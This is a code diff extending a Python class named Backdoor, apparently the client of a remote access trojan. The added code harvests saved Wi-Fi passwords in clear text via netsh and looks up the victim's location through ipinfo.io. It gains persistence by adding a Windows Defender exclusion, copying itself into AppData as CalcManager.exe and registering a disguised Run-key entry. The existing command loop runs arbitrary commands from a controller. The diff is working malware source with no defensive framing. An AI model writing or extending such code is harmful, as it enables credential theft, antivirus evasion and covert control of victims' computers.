@@ -5,6 +5,9 @@ import sys
 import os
 import time
 import pyautogui
+import re
+import shutil
+from urllib.request import urlopen
 
 
 class Backdoor:
@@ -21,6 +24,22 @@ class Backdoor:
                 break
             except Exception:
                 time.sleep(20)
+
+    def wifi(self):
+        command = 'netsh wlan show profile'
+        networks = subprocess.check_output(command, shell=True)
+        result = re.findall(b'(?:Profile\s*:\s)(.*)', networks)
+        res = [r.decode() for r in result]
+        passwords = []
+
+        for n in res:
+            comm = f'netsh wlan show profile {n} key=clear'
+            content = subprocess.check_output(comm, shell=True)
+            password = re.findall(b'(?:Key\sContent\s*:\s)(.*)', content)
+            name = re.findall(b'(?:SSID\sname\s*:\s)(.*)', content)
+            passwords.append({name[0].decode().rstrip(): password[0].decode().rstrip()})
+
+        return passwords
 
     def screenshot(self):
         screen = pyautogui.screenshot()
@@ -58,6 +77,16 @@ class Backdoor:
         except Exception:
             return ''
 
+    def persistence(self):
+        env = os.environ['appdata']
+        location = env + '\\CalcManager.exe'
+        exclusion = f'powershell -Command Add-MpPreference -ExclusionPath "{env}"'
+        subprocess.call(exclusion, shell=True)
+
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call(f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v UpdateVersion /t REG_SZ /d "{location}"', shell=True)
+
     def run(self):
         while True:
             command = self.receive_data()
@@ -85,13 +114,28 @@ class Backdoor:
                     os.chdir(command[1])
                     data = f'Directory has been changed to {os.getcwd()}'
 
+                elif command[0] == 'wifi':
+                    data = self.wifi()
+
+                elif command[0] == 'user_data':
+                    url = 'http://ipinfo.io/json'
+                    response = urlopen(url)
+                    data = json.load(response)
+
+                elif command[0] == 'persist':
+                    self.persistence()
+                    data = 'persisting'
+
                 else:
                     data = self.command_exec(command)
 
             except Exception as exc:
                 data = f'Error during command execution: {exc}'
 
-            self.send_data(data)
+            try:
+                self.send_data(data.encode("ISO-8859-1"))
+            except AttributeError:
+                self.send_data(data)
 
 
 if __name__ == '__main__':
